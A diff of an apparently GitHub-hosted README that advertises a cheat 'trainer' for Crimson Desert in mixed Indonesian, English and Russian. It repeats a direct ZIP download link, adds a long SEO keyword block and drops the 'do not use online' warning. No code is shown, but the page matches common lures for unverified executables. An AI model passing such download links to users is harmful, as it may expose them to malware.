@@ -1,9 +1,11 @@
-# Crimson Desert Trainer +12 (2026)
+# Trainer Crimson Desert +12 (2026)
 ### Infinite HP · Stamina · Spirit · One Hit · Money · Speed
 
-**Languages:** [English](README.md) · [Українська](README.uk.md) · [简体中文](README.zh.md) · [Türkçe](README.tr.md) · [Español](README.es.md) · [Slovenščina](README.sl.md) · [Português](README.pt.md) · [Polski](README.pl.md) · [Indonesia](README.id.md) · [Deutsch](README.de.md) · [Français](README.fr.md)
+**Languages / Языки:** [English](README.md) · [Русский](README.ru.md) · [Українська](README.uk.md) · [简体中文](README.zh.md) · [Türkçe](README.tr.md) · [Español](README.es.md) · [Slovenščina](README.sl.md) · [Português](README.pt.md) · [Polski](README.pl.md) · [Indonesia](README.id.md) · [Deutsch](README.de.md) · [Français](README.fr.md)
 
-Trainer untuk **Crimson Desert** — **+12** fitur: HP, stamina, spirit, damage, uang, kecepatan game, dan waktu.
+**Unduh trainer Crimson Desert** — +12 (2026).
+Infinite HP / Stamina / Spirit · One Hit · Money · Game Speed · Freeze Time.
+`CrimsonDesert.exe` · Windows 10/11
 
 
 <p align="center">
@@ -22,60 +24,53 @@ Trainer untuk **Crimson Desert** — **+12** fitur: HP, stamina, spirit, damage,
 
 <p align="center">
   <img src="https://img.shields.io/badge/game-Crimson%20Desert-111827"/>
-  <img src="https://img.shields.io/badge/cheats-%2B12-dc2626"/>
-  <img src="https://img.shields.io/badge/platform-Windows-lightgrey"/>
+  <img src="https://img.shields.io/badge/cheats-%2B12-ffcc00"/>
   <img src="https://img.shields.io/badge/process-CrimsonDesert.exe-22c55e"/>
+  <img src="https://img.shields.io/badge/year-2026-0ea5e9"/>
 </p>
 
 
 ---
 
-## Unduh
+## Unduh trainer Crimson Desert
 
-> Tautan langsung ZIP dari release:
+> Direct ZIP / Прямая ссылка:
 
-**→ [Unduh Crimson.Desert.Trainer.Le.zip](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip)**
+**→ [Crimson.Desert.Trainer.Le.zip](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip)**
 
-Release: **→ [v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/tag/v1.0.0)**
+Release / Релиз: **→ [v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/tag/v1.0.0)**
 
-Juga di **VGtimes**:  
-**→ [Post VGtimes — Crimson Desert trainer +12 (2026)](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)**
+Also on **VGtimes**: **→ [Crimson Desert trainer +12 (2026)](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)**
 
-Setelah unduh: jalankan game → jalankan trainer → tunggu `CrimsonDesert.exe` → aktifkan fitur.
+Game → trainer → `CrimsonDesert.exe` → enable cheats.
 
 ---
 
-## Video — uji fitur
-
-Demo lengkap di YouTube:
+## Video / Видео
 
 **→ [https://youtu.be/xJbFhv9Fa-g](https://youtu.be/xJbFhv9Fa-g)**
 
-<p align="center">
-  <a href="https://youtu.be/xJbFhv9Fa-g">
-    <img src="https://img.youtube.com/vi/xJbFhv9Fa-g/maxresdefault.jpg" alt="YouTube demo" width="860"/>
-  </a>
-</p>
+<p align="center"><a href="https://youtu.be/xJbFhv9Fa-g"><img src="https://img.youtube.com/vi/xJbFhv9Fa-g/maxresdefault.jpg" alt="Crimson Desert trainer video" width="860"/></a></p>
 
 ---
 
-## Screenshot
+## Screenshots / Скриншоты
 
 <p align="center">
-  <img src="screenshots/01-player.png" alt="Player" width="48%"/>
+  <img src="screenshots/01-player.png" alt="Player Infinite HP Stamina Spirit" width="48%"/>
   &nbsp;
-  <img src="screenshots/02-combat.png" alt="Combat" width="48%"/>
+  <img src="screenshots/02-combat.png" alt="Combat One Hit Defense" width="48%"/>
 </p>
 <p align="center">
-  <img src="screenshots/03-world.png" alt="World" width="48%"/>
+  <img src="screenshots/03-world.png" alt="World Freeze Time Game Speed" width="48%"/>
   &nbsp;
-  <img src="screenshots/04-items.png" alt="Items" width="48%"/>
+  <img src="screenshots/04-items.png" alt="Items Money Edit Amount" width="48%"/>
 </p>
 
 
 ---
 
-## Fitur (+12)
+## Features / Возможности (+12)
 
 ### Player
 - Infinite Health (`Num 1`)
@@ -100,72 +95,56 @@ Demo lengkap di YouTube:
 
 ---
 
-## Cara pakai
+## How to use / Как пользоваться
 
-1. Unduh ZIP lewat tombol hijau
-2. Ekstrak arsip
-3. Jalankan **Crimson Desert**
-4. Jalankan trainer
-5. Tunggu `CrimsonDesert.exe`
-6. Kategori: Player / Combat / World / Items
-7. `Num` = on/off · `Ctrl+Shift+Home` = master off
-
-| Tombol | Aksi |
-|---------|----------|
-| `Num …` | On / off |
-| `Ctrl + Shift + Home` | Master Off |
-
----
-
-## Tautan
-
-- **ZIP:** [Crimson.Desert.Trainer.Le.zip](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip)
-- **Release:** [v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/tag/v1.0.0)
-- **VGtimes:** [https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)
-- **YouTube:** [https://youtu.be/xJbFhv9Fa-g](https://youtu.be/xJbFhv9Fa-g)
-- **Repo:** [https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed)
-- **Org:** [https://github.com/TrainerHubMoggyDay](https://github.com/TrainerHubMoggyDay)
-
----
-
-## Versi yang didukung
+1. Download ZIP via the green button
+2. Extract
+3. Launch **Crimson Desert**
+4. Launch the trainer
+5. Wait for `CrimsonDesert.exe`
+6. Categories: Player / Combat / World / Items
+7. `Num` = toggle · `Ctrl+Shift+Home` = master off
 
 | | |
 |--|--|
-| Game | Crimson Desert |
-| Cheats | +12 |
-| Proses | `CrimsonDesert.exe` |
-| OS | Windows 10 / 11 |
-| Versi | v1.0.0 |
+| Game / Игра | Crimson Desert |
+| Process / Процесс | `CrimsonDesert.exe` |
+| Cheats / Читов | +12 |
+| Version / Версия | v1.0.0 |
+| Year | 2026 |
 
 ---
 
 ## FAQ
 
 **Di mana unduh?**  
-Tombol hijau atau [ZIP langsung](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip). Juga [VGtimes](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html).
+[ZIP v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip) · [VGtimes](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)
 
-**Infinite HP / One Hit / uang / speed?**  
-Ya — lihat fitur dan video.
+**Ada Infinite HP / One Hit / uang / speed?**  
+Yes — see features and video.
 
 **Berapa cheat?**  
-**+12** (Player / Combat / World / Items).
+**+12** — Player, Combat, World, Items.
 
 ---
 
 ## Disclaimer
 
-Hanya single-player. Penulis dan [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) tidak bertanggung jawab. Jangan pakai online.
+Hanya single-player. [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) tidak bertanggung jawab.
 
 ---
 
+
 <p align="center">
   <a href="https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip">
-    <img src="https://img.shields.io/badge/%F0%9F%93%A5%20DOWNLOAD%20ZIP-22c55e?style=for-the-badge&labelColor=14532d" alt="Download"/>
+    <img src="https://img.shields.io/badge/%F0%9F%93%A5%20DOWNLOAD%20TRAINER-v1.0.0-22c55e?style=for-the-badge&labelColor=14532d" alt="Download"/>
   </a>
 </p>
+<p align="center"><sub>Crimson Desert Trainer +12 · <a href="https://github.com/TrainerHubMoggyDay">TrainerHub MoggyDay</a></sub></p>
 
-<p align="center">
-  <sub>Crimson Desert Trainer +12 · <a href="https://github.com/TrainerHubMoggyDay">TrainerHub MoggyDay</a></sub>
-</p>
 
+---
+
+## SEO / Keywords
+
+`unduh trainer Crimson Desert` · `Crimson Desert cheat` · `Crimson Desert god mode` · `Crimson Desert infinite HP` · `download Crimson Desert trainer` · `Crimson Desert trainer download` · `Crimson Desert cheats` · `Crimson Desert hack` · `Crimson Desert mods` · `Crimson Desert god mode` · `Crimson Desert infinite health` · `Crimson Desert infinite HP` · `Crimson Desert infinite stamina` · `Crimson Desert infinite spirit` · `Crimson Desert one hit kill` · `Crimson Desert super damage` · `Crimson Desert money hack` · `Crimson Desert infinite money` · `Crimson Desert game speed` · `Crimson Desert freeze time` · `Crimson Desert daytime freeze` · `Crimson Desert trainer free` · `Crimson Desert trainer 2026` · `Crimson Desert trainer windows` · `CrimsonDesert.exe trainer` · `Crimson Desert +12 trainer` · `action adventure trainer` · `pearl abyss trainer` · `single player trainer` · `pc trainer Crimson Desert` · `TrainerHub MoggyDay`
